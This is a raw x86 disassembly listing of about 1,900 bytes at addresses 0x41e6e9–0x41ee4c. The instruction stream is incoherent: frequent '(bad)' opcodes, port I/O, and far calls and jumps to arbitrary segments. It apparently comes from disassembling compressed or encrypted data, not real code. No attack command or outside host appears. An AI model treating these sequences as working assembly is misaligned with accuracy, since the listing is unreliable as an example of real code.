  41e6e9:	pop    si
  41e6eb:	in     al,0x40
  41e6ed:	dec    esi
  41e6ee:	aad    0xd6
  41e6f0:	paddd  mm5,QWORD PTR [edi]
  41e6f3:	popa   
  41e6f4:	ss into 
  41e6f6:	mov    ds:0xafd51efe,al
  41e6fb:	mov    ecx,0xc491cf74
  41e700:	adc    al,0x23
  41e702:	xchg   edi,eax
  41e703:	push   esp
  41e704:	ss call 0x2458:0x69445c28
  41e70c:	inc    edi
  41e70d:	inc    ebp
  41e70e:	test   al,0x95
  41e710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e711:	shr    DWORD PTR [ebx+ebp*2-0x404dfad4],cl
  41e718:	stc    
  41e719:	add    BYTE PTR [eax],al
  41e71b:	add    BYTE PTR [edi+0x4c],dh
  41e71e:	idiv   dh
  41e720:	(bad)  
  41e721:	(bad)  
  41e722:	jg     0x41e6f1
  41e724:	mov    ah,0x6b
  41e726:	mov    dh,0x14
  41e728:	jne    0x41e6d6
  41e72a:	scas   eax,DWORD PTR es:[edi]
  41e72b:	jnp    0x41e7aa
  41e72d:	add    DWORD PTR fs:[eax],eax
  41e730:	test   DWORD PTR [edx],eax
  41e732:	add    BYTE PTR [eax],al
  41e734:	push   edx
  41e735:	int3   
  41e736:	call   0x552d:0x62fad075
  41e73d:	sar    esp,1
  41e73f:	imul   edx,DWORD PTR [edx],0x95967f77
  41e745:	out    0x3f,al
  41e747:	pop    ebp
  41e748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e749:	aad    0x6f
  41e74b:	call   0xea26:0xd476cfca
  41e752:	mov    eax,ebx
  41e754:	jg     0x41e7d1
  41e756:	mov    al,ds:0xb164ad8d
  41e75b:	cwde   
  41e75c:	pop    edi
  41e75d:	adc    eax,0x2fde7171
  41e762:	neg    dh
  41e764:	mov    dh,BYTE PTR [ebp+0x68]
  41e767:	data16 je 0x41e796
  41e76a:	iret   
  41e76b:	mov    ebx,0x2c43c65d
  41e770:	popf   
  41e771:	out    0x6d,al
  41e773:	sub    bh,BYTE PTR [esi+eax*1-0xc]
  41e777:	imul   eax,ecx,0x8ce39b65
  41e77d:	mov    ebp,0xb7eb1c4d
  41e782:	stc    
  41e783:	test   al,0x64
  41e785:	pop    si
  41e787:	sub    eax,0x127cdc18
  41e78c:	add    eax,DWORD PTR [edi+eiz*1]
  41e78f:	sbb    al,BYTE PTR [edx]
  41e791:	dec    edx
  41e792:	and    edx,DWORD PTR [edi+0x32651869]
  41e798:	stc    
  41e799:	push   es
  41e79a:	fadd   st(5),st
  41e79d:	lock xchg ebp,eax
  41e79f:	xchg   ecx,eax
  41e7a0:	aad    0x5e
  41e7a2:	mov    dh,0xea
  41e7a4:	xor    BYTE PTR [ecx],bh
  41e7a6:	lods   eax,DWORD PTR ds:[esi]
  41e7a7:	in     al,dx
  41e7a8:	jnp    0x41e7f9
  41e7aa:	xchg   ebx,eax
  41e7ab:	and    eax,0x98792fb4
  41e7b0:	adc    ebp,ebx
  41e7b2:	adc    al,0x43
  41e7b4:	pop    eax
  41e7b5:	stos   DWORD PTR es:[edi],eax
  41e7b6:	test   BYTE PTR [edx],al
  41e7b8:	xchg   ebp,eax
  41e7b9:	hlt    
  41e7ba:	xor    eax,0x8f4cb450
  41e7bf:	mov    ds:0xf2db539f,al
  41e7c4:	sub    DWORD PTR [ecx],eax
  41e7c6:	mov    ebx,DWORD PTR ds:0x47cf11f8
  41e7cc:	aas    
  41e7cd:	dec    esp
  41e7ce:	jmp    0x41e75c
  41e7d0:	xchg   edi,eax
  41e7d1:	add    ebx,0x81d901d7
  41e7d7:	ror    DWORD PTR [edx+0x1e9eee4d],0xd6
  41e7de:	mov    ds:0xe6c89636,al
  41e7e3:	arpl   WORD PTR [ecx],sp
  41e7e5:	xor    BYTE PTR [ecx+0x6a],dl
  41e7e8:	loopne 0x41e864
  41e7ea:	stos   BYTE PTR es:[edi],al
  41e7eb:	mov    ebp,0xa8b9296f
  41e7f0:	dec    ebp
  41e7f1:	out    dx,al
  41e7f2:	mov    al,ds:0x4eb4d654
  41e7f7:	popf   
  41e7f8:	retf   0xb60b
  41e7fb:	stos   BYTE PTR es:[edi],al
  41e7fc:	and    eax,ecx
  41e7fe:	mov    cl,bl
  41e800:	cmc    
  41e801:	ret    0xcfb7
  41e804:	out    0x7d,eax
  41e806:	push   0x8a17b3f1
  41e80b:	inc    eax
  41e80c:	fidivr WORD PTR [edx-0x73]
  41e80f:	dec    esi
  41e810:	add    BYTE PTR [ebx-0x39de9cf],dh
  41e816:	push   ds
  41e817:	les    esi,FWORD PTR [eax+0x36]
  41e81a:	cld    
  41e81b:	jmp    0x41e84d
  41e81d:	push   esp
  41e81e:	dec    esi
  41e81f:	jne    0x41e81c
  41e821:	pop    eax
  41e822:	pop    ecx
  41e823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e825:	jnp    0x41e882
  41e827:	jo     0x41e7d0
  41e829:	or     BYTE PTR [edx+0x14],bl
  41e82c:	repz push edi
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	and    BYTE PTR [ecx],0x75
  41e832:	jmp    0x17f3b77d
  41e837:	pop    es
  41e838:	out    dx,eax
  41e839:	dec    edx
  41e83a:	clc    
  41e83b:	iret   
  41e83c:	adc    DWORD PTR ds:0x4f51d394,edx
  41e842:	lods   al,BYTE PTR ds:[esi]
  41e843:	aad    0x39
  41e845:	ja     0x41e8a6
  41e847:	test   al,0xdf
  41e849:	dec    edx
  41e84a:	cmp    al,0x83
  41e84c:	sub    eax,0x88d8719e
  41e851:	and    al,0xb1
  41e853:	mov    cl,0x29
  41e855:	das    
  41e856:	std    
  41e857:	sbb    eax,0x62b43641
  41e85c:	cmp    DWORD PTR [ebx+0x79],edx
  41e85f:	lods   al,BYTE PTR ds:[esi]
  41e860:	cli    
  41e861:	repz xchg ebx,eax
  41e863:	inc    edx
  41e864:	in     al,0xb2
  41e866:	jmp    0x4d0e:0xe63be9e0
  41e86d:	mov    ds:0x1d486806,eax
  41e872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e873:	(bad)  
  41e874:	setns  bl
  41e877:	dec    ecx
  41e878:	pop    ecx
  41e879:	nop
  41e87a:	cld    
  41e87b:	nop
  41e87c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e87d:	xor    BYTE PTR [esi],dh
  41e87f:	mov    ebp,0x4011264b
  41e884:	fs dec esi
  41e886:	push   eax
  41e887:	mov    eax,ds:0x57ae6886
  41e88c:	mov    ecx,0x3b2a60c2
  41e891:	lock int3 
  41e893:	iret   
  41e894:	dec    edx
  41e895:	loop   0x41e819
  41e897:	cwde   
  41e898:	stos   BYTE PTR es:[edi],al
  41e899:	popf   
  41e89a:	sub    bh,BYTE PTR [edx+0x35]
  41e89d:	xchg   DWORD PTR [ebx+0x1],esi
  41e8a0:	pop    edi
  41e8a1:	jle    0x41e8a6
  41e8a3:	xchg   esp,eax
  41e8a4:	and    eax,0xe0eefca6
  41e8a9:	add    DWORD PTR [esi+ebx*2+0xc62f9b],0x65
  41e8b1:	bswap  esp
  41e8b3:	add    DWORD PTR [eax-0x53],esi
  41e8b6:	jp     0x41e8c3
  41e8b8:	loope  0x41e921
  41e8ba:	push   es
  41e8bb:	xchg   ebp,eax
  41e8bc:	mov    eax,esp
  41e8be:	add    DWORD PTR [edi+0x50],ebx
  41e8c1:	cld    
  41e8c2:	push   ss
  41e8c3:	cmp    BYTE PTR [ecx+0x1cb79e21],cl
  41e8c9:	shl    DWORD PTR [edx],cl
  41e8cb:	and    BYTE PTR [edi],0x24
  41e8ce:	push   edx
  41e8cf:	mov    ebx,0x3269cf45
  41e8d4:	retf   
  41e8d5:	fist   DWORD PTR [edi+0x681a8161]
  41e8db:	addr16 hlt 
  41e8dd:	(bad)  
  41e8de:	xchg   edi,eax
  41e8df:	push   cs
  41e8e0:	jo     0x41e8e0
  41e8e2:	push   ebx
  41e8e3:	jns    0x41e928
  41e8e5:	dec    ebp
  41e8e6:	imul   esp,esi,0xffffffd1
  41e8e9:	mov    al,ds:0x95e219f6
  41e8ee:	mov    edi,0x6985436e
  41e8f3:	imul   DWORD PTR [edi-0x4f]
  41e8f6:	in     al,0x43
  41e8f8:	mov    ds:0xc8c2139d,eax
  41e8fd:	das    
  41e8fe:	out    dx,al
  41e8ff:	mov    edx,esp
  41e901:	push   esi
  41e902:	or     ecx,edi
  41e904:	aad    0x35
  41e906:	cmp    cl,BYTE PTR ds:0x3785aa1c
  41e90c:	or     bh,bh
  41e90e:	push   ebx
  41e90f:	lahf   
  41e910:	idiv   DWORD PTR [edi+0x5e]
  41e913:	leave  
  41e914:	push   es
  41e915:	sar    DWORD PTR [ebx-0x2a1aeb4b],cl
  41e91b:	daa    
  41e91c:	jg     0x41e93e
  41e91e:	(bad)  
  41e91f:	sar    BYTE PTR [edi+0x18],0xb2
  41e923:	push   0xffffffdf
  41e925:	or     eax,0x986979c1
  41e92a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41e92c:	fnstcw WORD PTR [ebp*1-0x660df4ef]
  41e933:	xor    DWORD PTR ds:0xe87171c7,esp
  41e939:	or     cl,BYTE PTR [esi+0x8581482]
  41e93f:	stos   DWORD PTR es:[edi],eax
  41e940:	xor    BYTE PTR [edi-0x18],cl
  41e943:	mov    dl,0xfb
  41e945:	cmp    eax,0xb732da6d
  41e94a:	fs cmp eax,0xa47a599
  41e950:	inc    edi
  41e951:	mov    dh,0x61
  41e953:	mov    eax,ds:0xb7415750
  41e958:	pop    es
  41e959:	push   es
  41e95a:	fisttp WORD PTR [ebp-0x1b]
  41e95d:	aaa    
  41e95e:	adc    DWORD PTR [ebx],eax
  41e960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e961:	push   0x67
  41e963:	push   edi
  41e964:	xor    eax,0xb761aac2
  41e969:	cmp    BYTE PTR [esi],bh
  41e96b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e96c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e96d:	mov    ebp,0xd4a9e98
  41e972:	imul   ebx,edi,0xffffffa3
  41e975:	add    bh,dl
  41e977:	ins    BYTE PTR es:[edi],dx
  41e978:	adc    DWORD PTR [edi-0x6f2daf44],esp
  41e97e:	mov    ah,0x74
  41e980:	or     DWORD PTR [ebx+ebx*2],ebx
  41e983:	int3   
  41e984:	sub    ah,bh
  41e986:	stc    
  41e987:	and    eax,DWORD PTR [esi+0x1700ebbd]
  41e98d:	in     eax,0xe3
  41e98f:	inc    ebp
  41e990:	les    esp,FWORD PTR [eax+0x5a1603b4]
  41e996:	xor    DWORD PTR [esi+0x11],0xffffff80
  41e99a:	or     BYTE PTR [eax+ebx*1+0x36],al
  41e99e:	cmp    al,0x19
  41e9a0:	mov    ds:0x8a188f91,eax
  41e9a5:	outs   dx,DWORD PTR ds:[esi]
  41e9a6:	xor    DWORD PTR [ecx-0x4c],ecx
  41e9a9:	pop    eax
  41e9aa:	or     DWORD PTR [edi],ecx
  41e9ac:	pop    es
  41e9ad:	dec    esp
  41e9ae:	mov    esi,0x3c19f7a3
  41e9b3:	test   BYTE PTR [edx+0x78765802],dl
  41e9b9:	add    BYTE PTR [eax],al
  41e9bb:	add    BYTE PTR [edi],al
  41e9bd:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  41e9c3:	pop    ds
  41e9c4:	xchg   BYTE PTR [ebx],bl
  41e9c6:	mov    edx,0xfdbc15d0
  41e9cb:	in     al,dx
  41e9cc:	add    ah,BYTE PTR [edi+0x1]
  41e9cf:	add    BYTE PTR [ebp+0x50000002],al
  41e9d5:	mov    esi,0x72073642
  41e9da:	add    edi,DWORD PTR [eax+0xcb8d6e]
  41e9e0:	xchg   ebp,ebx
  41e9e2:	mov    ecx,0x835e9698
  41e9e7:	gs cwde 
  41e9e9:	add    esi,DWORD PTR [di]
  41e9ec:	adc    BYTE PTR [esi+0x7a],dl
  41e9ef:	sbb    al,0xf5
  41e9f1:	xchg   esp,eax
  41e9f2:	push   ebx
  41e9f3:	out    dx,al
  41e9f4:	mov    edi,0xbc848b25
  41e9f9:	xor    DWORD PTR [edx+0x4c],eax
  41e9fc:	aam    0x93
  41e9fe:	and    ebp,DWORD PTR [ebp+0x752063eb]
  41ea04:	(bad)  
  41ea05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea06:	push   ecx
  41ea07:	fxch   st(0)
  41ea09:	add    al,0x29
  41ea0b:	mov    eax,0xadc07be1
  41ea10:	icebp  
  41ea11:	jne    0x41ea92
  41ea13:	mov    al,ds:0x574ec2d0
  41ea18:	xlat   BYTE PTR ds:[ebx]
  41ea19:	fstp   DWORD PTR [ecx-0xe253ce4]
  41ea1f:	ins    BYTE PTR es:[edi],dx
  41ea20:	shl    BYTE PTR [edi],0x7f
  41ea23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea24:	cs sub al,0x11
  41ea27:	and    cl,dl
  41ea29:	rep ins BYTE PTR es:[edi],dx
  41ea2b:	or     DWORD PTR [esi-0x4325da5b],0xffffffc6
  41ea32:	xor    ah,BYTE PTR [ebx]
  41ea34:	pusha  
  41ea35:	int    0xc8
  41ea37:	sbb    BYTE PTR [ecx-0x24],ch
  41ea3a:	cs and eax,0x89561b40
  41ea40:	lahf   
  41ea41:	repnz popf 
  41ea43:	daa    
  41ea44:	xor    al,0xd5
  41ea46:	xchg   bh,ah
  41ea48:	cmp    eax,0xdd616f48
  41ea4d:	cmc    
  41ea4e:	sbb    edx,DWORD PTR [esi+0x4d]
  41ea51:	(bad)  
  41ea52:	in     al,0xff
  41ea54:	pop    eax
  41ea55:	dec    ebx
  41ea56:	xchg   esi,eax
  41ea57:	ss test al,0xc4
  41ea5a:	pusha  
  41ea5b:	ja     0x41e9ef
  41ea5d:	in     eax,dx
  41ea5e:	call   0x7916:0x4c47d39d
  41ea65:	ja     0x41eabc
  41ea67:	mov    dl,0x19
  41ea69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea6a:	pop    eax
  41ea6b:	mov    al,0x20
  41ea6d:	idiv   DWORD PTR [ebx+0x7b]
  41ea70:	jmp    0xc78a0ad5
  41ea75:	in     eax,dx
  41ea76:	addr16 fcmovnbe st,st(5)
  41ea79:	add    esi,ecx
  41ea7b:	pop    eax
  41ea7c:	sub    al,BYTE PTR [edi+ebp*1-0x5efdf7ac]
  41ea83:	sahf   
  41ea84:	sbb    al,BYTE PTR [ebp+0x5a]
  41ea87:	mov    ah,0xd
  41ea89:	sub    ecx,DWORD PTR [ecx+0x1e]
  41ea8c:	xchg   DWORD PTR [edi+0x3b19bd13],edx
  41ea92:	dec    esi
  41ea93:	in     al,dx
  41ea94:	popf   
  41ea95:	in     eax,0xc5
  41ea97:	mov    eax,0x4ce3948a
  41ea9c:	cli    
  41ea9d:	mov    ah,0xe1
  41ea9f:	dec    edx
  41eaa0:	cld    
  41eaa1:	jb     0x41ea25
  41eaa3:	and    cl,BYTE PTR [edi+0x4d]
  41eaa6:	pusha  
  41eaa7:	push   ebx
  41eaa8:	test   al,0x57
  41eaaa:	in     eax,dx
  41eaab:	ins    BYTE PTR es:[edi],dx
  41eaac:	or     eax,0x33b7e7f6
  41eab1:	and    BYTE PTR [ebx-0x2e],cl
  41eab4:	or     DWORD PTR [ebx-0xb],0x1f
  41eab8:	push   ds
  41eab9:	or     cl,BYTE PTR [eax]
  41eabb:	ror    DWORD PTR [ebp+0x2f164df4],1
  41eac1:	jns    0x41eaa6
  41eac3:	push   eax
  41eac4:	xor    BYTE PTR [ebx+0x5737c197],0x69
  41eacb:	dec    edi
  41eacc:	push   0xffffff84
  41eace:	dec    ebx
  41eacf:	std    
  41ead0:	ret    0xd259
  41ead3:	loop   0x41eaf4
  41ead5:	sbb    al,0x7e
  41ead7:	cs mov eax,0x853c3d95
  41eadd:	mov    ebx,0x781367ab
  41eae2:	test   BYTE PTR [ecx-0x3ee589c0],ch
  41eae8:	inc    eax
  41eae9:	and    dl,BYTE PTR [esi]
  41eaeb:	fistp  QWORD PTR [ebx-0x3d2aed9a]
  41eaf1:	mov    bl,dh
  41eaf3:	test   eax,0x921805c8
  41eaf8:	pop    es
  41eaf9:	dec    DWORD PTR [edx+0x2b]
  41eafc:	cmp    al,0xc9
  41eafe:	push   esi
  41eaff:	and    BYTE PTR [ecx],bh
  41eb01:	lods   eax,DWORD PTR ds:[esi]
  41eb02:	push   eax
  41eb03:	cmp    DWORD PTR [esi],0x64
  41eb06:	pop    edi
  41eb08:	(bad)  
  41eb09:	lock push edi
  41eb0b:	jle    0x41eb46
  41eb0d:	dec    eax
  41eb0e:	cld    
  41eb0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb10:	repnz lods al,BYTE PTR ds:[esi]
  41eb12:	hlt    
  41eb13:	pop    eax
  41eb14:	jo     0x41eb7e
  41eb16:	cs cmp edi,esi
  41eb19:	aam    0xed
  41eb1b:	arpl   WORD PTR [edx],bp
  41eb1d:	mov    cl,0xaa
  41eb1f:	mul    DWORD PTR [ebx-0xc45dd80]
  41eb25:	dec    ebx
  41eb26:	add    edx,DWORD PTR [ecx-0x60a45b50]
  41eb2c:	add    eax,0xf9e315e
  41eb31:	je     0x41eba8
  41eb33:	daa    
  41eb34:	imul   eax,DWORD PTR [edi+0xc],0x41
  41eb38:	call   0xb2c4a3e8
  41eb3d:	enter  0x5818,0x7b
  41eb41:	jno    0x41eb57
  41eb43:	mov    fs,WORD PTR [ebx]
  41eb45:	pop    ecx
  41eb46:	fsubr  DWORD PTR ds:0xca68710
  41eb4c:	adc    esi,eax
  41eb4e:	test   esi,eax
  41eb50:	add    al,0xe5
  41eb52:	cmp    eax,0xa4947ac7
  41eb57:	adc    ch,ah
  41eb59:	mov    dh,0xf
  41eb5b:	xchg   bx,ax
  41eb5d:	add    eax,0x3dfade83
  41eb62:	int    0xb7
  41eb64:	mov    eax,0x24599cc5
  41eb69:	sbb    edi,DWORD PTR [edi+0x767c85d7]
  41eb6f:	out    dx,eax
  41eb70:	pop    ebp
  41eb71:	mov    dl,0x93
  41eb73:	sub    eax,eax
  41eb75:	dec    ebx
  41eb76:	jmp    0xf2067225
  41eb7b:	dec    esp
  41eb7c:	ret    0x6f09
  41eb7f:	ret    0x1ea2
  41eb82:	xchg   ebp,eax
  41eb83:	and    eax,0xeffbcd50
  41eb88:	adc    al,0xee
  41eb8a:	xor    dl,BYTE PTR [ebx-0x52]
  41eb8d:	dec    esi
  41eb8e:	xor    ah,bl
  41eb90:	adc    DWORD PTR [edx],ebp
  41eb92:	mov    gs,WORD PTR [ebp+0x37b590fd]
  41eb98:	out    0xda,eax
  41eb9a:	add    ebp,DWORD PTR [edi+0x1f5e948c]
  41eba0:	jp     0x41eba0
  41eba2:	ret    0x6dd4
  41eba5:	cmp    dh,BYTE PTR [ebp-0x63]
  41eba8:	mov    ds:0x5c64d060,eax
  41ebad:	and    al,0x95
  41ebaf:	repnz pop edx
  41ebb1:	mov    al,gs:0x1779abea
  41ebb7:	xchg   edx,ebp
  41ebb9:	repnz xor BYTE PTR [eax-0x58],0xc4
  41ebbe:	addr16 xchg ecx,eax
  41ebc0:	nop
  41ebc1:	cld    
  41ebc2:	es pusha 
  41ebc4:	(bad)  
  41ebc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebc6:	sub    BYTE PTR [edi-0x5d],ah
  41ebc9:	inc    edi
  41ebca:	xor    bl,BYTE PTR [edx]
  41ebcc:	jmp    0x41ebc0
  41ebce:	cmp    al,0xe7
  41ebd0:	mov    edx,0x27872a66
  41ebd5:	out    dx,eax
  41ebd6:	(bad)  
  41ebd7:	pop    ebx
  41ebd8:	pop    ecx
  41ebd9:	fst    DWORD PTR [eax-0x6215e61f]
  41ebdf:	(bad)  
  41ebe0:	cli    
  41ebe1:	mov    ch,0x74
  41ebe3:	jmp    0x46de:0xe1f08aa2
  41ebea:	cmp    ecx,DWORD PTR [eax+eiz*2-0x36]
  41ebee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebef:	aad    0x70
  41ebf1:	rcr    BYTE PTR [edi-0x2a],1
  41ebf4:	cdq    
  41ebf5:	mov    eax,ds:0x74e1f8aa
  41ebfa:	jb     0x41ebea
  41ebfc:	jmp    0x11ece348
  41ec01:	fimul  DWORD PTR [ebp+0xdaf2e98]
  41ec07:	in     eax,0xb6
  41ec09:	sub    BYTE PTR [edx+edx*4+0x51],cl
  41ec0d:	scas   eax,DWORD PTR es:[edi]
  41ec0e:	inc    edi
  41ec0f:	or     al,0xc6
  41ec11:	dec    esp
  41ec12:	or     bh,BYTE PTR [ecx]
  41ec14:	sahf   
  41ec15:	loope  0x41ec2f
  41ec17:	loop   0x41ec41
  41ec19:	dec    esp
  41ec1a:	mov    BYTE PTR [ebp+0x6354f09e],bh
  41ec20:	inc    ecx
  41ec21:	sub    eax,0x572462d8
  41ec26:	fiadd  WORD PTR [eax+0x7c]
  41ec29:	(bad)  
  41ec2a:	shl    BYTE PTR [bp+di+0x7],cl
  41ec2e:	int3   
  41ec2f:	dec    ecx
  41ec30:	and    DWORD PTR [edi-0x6ad4f94],ebp
  41ec36:	add    ch,BYTE PTR [edi+edi*4-0x3d]
  41ec3a:	dec    edx
  41ec3b:	sbb    ch,BYTE PTR [ecx]
  41ec3d:	pushf  
  41ec3e:	sub    edi,DWORD PTR cs:[ebx-0x7e4813df]
  41ec45:	popf   
  41ec46:	xor    DWORD PTR [edi],0x58f0ef57
  41ec4c:	add    al,0xbd
  41ec4e:	mov    al,ds:0xef212e05
  41ec53:	test   al,0xb8
  41ec55:	push   ebp
  41ec56:	pop    eax
  41ec57:	retf   
  41ec58:	sbb    al,BYTE PTR [eax]
  41ec5a:	add    BYTE PTR [eax],al
  41ec5c:	push   ds
  41ec5d:	add    al,0xa7
  41ec5f:	(bad)  
  41ec60:	mov    edi,0xf6dd7ee7
  41ec65:	jp     0x41ec30
  41ec67:	push   esi
  41ec68:	leave  
  41ec69:	adc    DWORD PTR [ecx+0x169871b],edi
  41ec6f:	add    BYTE PTR [ebp+0x2],al
  41ec75:	or     ebx,DWORD PTR [edx]
  41ec77:	adc    eax,0xdfb91c7d
  41ec7c:	cmp    esi,DWORD PTR [esi+0x7]
  41ec7f:	and    al,0x42
  41ec81:	fcom   QWORD PTR [eax]
  41ec83:	sbb    esp,DWORD PTR [ebp-0x3b6cc33f]
  41ec89:	xchg   edx,eax
  41ec8a:	sbb    edx,ecx
  41ec8c:	add    ah,BYTE PTR [edx+0x6f]
  41ec8f:	arpl   WORD PTR [eiz*4+0x2adf171],bp
  41ec96:	add    eax,0xcf6f5a97
  41ec9b:	dec    ecx
  41ec9c:	rcl    DWORD PTR [ebx-0x6c],1
  41ec9f:	mov    ebx,0x57e74779
  41eca4:	dec    esi
  41eca5:	shr    DWORD PTR [ebx],cl
  41eca7:	mov    ecx,0x1b53338f
  41ecac:	pushf  
  41ecad:	callw  0x626b
  41ecb1:	pop    ds
  41ecb2:	inc    esi
  41ecb3:	popf   
  41ecb4:	inc    edi
  41ecb5:	retf   0xf729
  41ecb8:	dec    esi
  41ecb9:	or     bh,BYTE PTR [edi-0x4ff75728]
  41ecbf:	mov    BYTE PTR [edi],dl
  41ecc1:	lods   al,BYTE PTR ds:[esi]
  41ecc2:	in     al,dx
  41ecc3:	add    BYTE PTR [ebx],dh
  41ecc5:	jae    0x41ec8c
  41ecc7:	test   ebp,0x5bea0e1b
  41eccd:	mov    esi,0x90cc7c0
  41ecd2:	sub    eax,ebx
  41ecd4:	push   ecx
  41ecd5:	xchg   ebx,eax
  41ecd6:	mov    bl,0x6d
  41ecd8:	mov    dh,0xb3
  41ecda:	mov    edx,0xd347bbc2
  41ecdf:	push   esp
  41ece0:	sbb    eax,0x4a4570fc
  41ece5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ece6:	dec    ebp
  41ece7:	adc    edi,ebp
  41ece9:	mov    bl,0x5f
  41eceb:	xlat   BYTE PTR ds:[ebx]
  41ecec:	adc    al,0x7b
  41ecee:	or     edx,DWORD PTR [edi-0x5c37fffa]
  41ecf4:	(bad)  
  41ecf6:	cmp    dh,ch
  41ecf8:	push   ds
  41ecf9:	cwde   
  41ecfa:	jmp    0x4826:0xb2fe1245
  41ed01:	push   eax
  41ed02:	inc    eax
  41ed03:	scas   al,BYTE PTR es:[edi]
  41ed04:	imul   DWORD PTR [eax]
  41ed06:	sbb    ebp,DWORD PTR [edx]
  41ed08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed09:	imul   DWORD PTR [eax]
  41ed0b:	aas    
  41ed0c:	fbstp  TBYTE PTR [ebx-0x7e500a13]
  41ed12:	adc    esi,DWORD PTR [esi-0x2e8760c2]
  41ed18:	cmp    DWORD PTR [esi-0xed67cf0],eax
  41ed1e:	(bad)  
  41ed1f:	mov    cl,bl
  41ed21:	aad    0x15
  41ed23:	jb     0x41ed6f
  41ed25:	in     al,0x34
  41ed27:	jo     0x41ecea
  41ed29:	lea    esp,[edx+0x3d]
  41ed2c:	sbb    eax,0xa7f287ed
  41ed31:	sar    esp,1
  41ed33:	push   ebp
  41ed34:	mov    ds:0x655d8435,al
  41ed39:	idiv   al
  41ed3b:	cmp    BYTE PTR [edx+0x61529998],dh
  41ed41:	ror    BYTE PTR [esi],1
  41ed43:	stos   DWORD PTR es:[edi],eax
  41ed44:	push   es
  41ed45:	call   0x2573:0x8f396874
  41ed4c:	aas    
  41ed4d:	test   eax,0x7a9cf042
  41ed52:	cmp    eax,0x8743da4d
  41ed57:	cmc    
  41ed58:	xor    ebp,esi
  41ed5a:	aad    0x3e
  41ed5c:	push   ss
  41ed5d:	mov    edx,0xe7232c1a
  41ed62:	sub    eax,0x8bd287cf
  41ed67:	fist   DWORD PTR [esi]
  41ed69:	inc    esp
  41ed6a:	(bad)  
  41ed6d:	(bad)  
  41ed6e:	(bad)  
  41ed6f:	mov    dh,0x50
  41ed71:	inc    ebp
  41ed72:	mov    dh,0xf
  41ed74:	in     al,dx
  41ed75:	add    esi,ebx
  41ed77:	stc    
  41ed78:	sub    BYTE PTR [esi-0x394334f],bh
  41ed7e:	push   ebp
  41ed7f:	cmp    BYTE PTR [edx+0x715d40a1],al
  41ed85:	lea    esi,[edi-0x74998d93]
  41ed8b:	cld    
  41ed8c:	retf   
  41ed8d:	mov    eax,0xfa424b88
  41ed92:	jae    0x41ed3c
  41ed94:	mov    DWORD PTR [ebx],ebp
  41ed96:	adc    ebp,DWORD PTR [edi+0x50]
  41ed99:	fnsave [ecx+eax*1]
  41ed9c:	push   eax
  41ed9d:	push   eax
  41ed9e:	jle    0x41edb8
  41eda0:	xor    edx,DWORD PTR [edx-0x491d608b]
  41eda6:	cmp    eax,0xcef1b14e
  41edab:	ss push esi
  41edad:	das    
  41edae:	or     BYTE PTR [esi],bl
  41edb0:	cwde   
  41edb1:	xor    DWORD PTR [ebp-0x19],0xabeff201
  41edb8:	shl    DWORD PTR ds:0xcab4556b,cl
  41edbe:	xor    DWORD PTR [eax],ebp
  41edc0:	sub    dl,ch
  41edc2:	pusha  
  41edc3:	aam    0x63
  41edc5:	pusha  
  41edc6:	test   al,0x86
  41edc8:	mov    ch,0x25
  41edca:	js     0x41ee18
  41edcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edcd:	jecxz  0x41ee3a
  41edcf:	push   ss
  41edd0:	stos   BYTE PTR es:[edi],al
  41edd1:	ins    DWORD PTR es:[edi],dx
  41edd2:	mov    ecx,0x2eba1309
  41edd7:	jae    0x41edbb
  41edd9:	dec    edi
  41edda:	dec    esp
  41eddb:	mov    al,ds:0x1bdc3334
  41ede0:	or     DWORD PTR [eax-0x4b95d246],edx
  41ede6:	sbb    DWORD PTR [edi+0x71185fa3],ebp
  41edec:	adc    ebp,DWORD PTR [esi+0x9]
  41edef:	stos   BYTE PTR es:[edi],al
  41edf0:	lds    esp,FWORD PTR [edx]
  41edf2:	call   0x59042e4
  41edf7:	dec    esp
  41edf8:	push   cs
  41edf9:	push   ebx
  41edfa:	pop    ecx
  41edfb:	or     cl,BYTE PTR [edi]
  41edfd:	inc    eax
  41edfe:	cmp    BYTE PTR ds:0x3381967d,bl
  41ee04:	(bad)  
  41ee05:	div    BYTE PTR [ebp+0x76]
  41ee08:	fstp   TBYTE PTR [ebx]
  41ee0a:	xchg   esp,eax
  41ee0b:	dec    esi
  41ee0c:	xchg   edx,eax
  41ee0d:	jnp    0x41ede2
  41ee0f:	inc    ebx
  41ee10:	sbb    DWORD PTR [eax+edi*8],ebp
  41ee13:	stc    
  41ee14:	pop    ebx
  41ee15:	sti    
  41ee16:	les    ecx,FWORD PTR [esi+0x5c04396b]
  41ee1c:	mov    cl,BYTE PTR [esi+0x5b]
  41ee1f:	add    bh,bl
  41ee21:	sbb    DWORD PTR [edi-0x72],ebx
  41ee24:	mov    ah,al
  41ee26:	and    DWORD PTR [esp+eiz*8+0x606d9408],ecx
  41ee2d:	call   0xd5dba12c
  41ee32:	fcomp  DWORD PTR [ecx]
  41ee34:	das    
  41ee35:	dec    esp
  41ee36:	mov    WORD PTR [ebx+0x4315c69a],?
  41ee3c:	pop    ebp
  41ee3d:	je     0x41eeb1
  41ee3f:	dec    esi
  41ee41:	int    0xd1
  41ee43:	cmp    cl,BYTE PTR [ecx-0x51a90214]
  41ee49:	dec    edi
  41ee4a:	out    0xda,eax
  41ee4c:	in     eax,dx
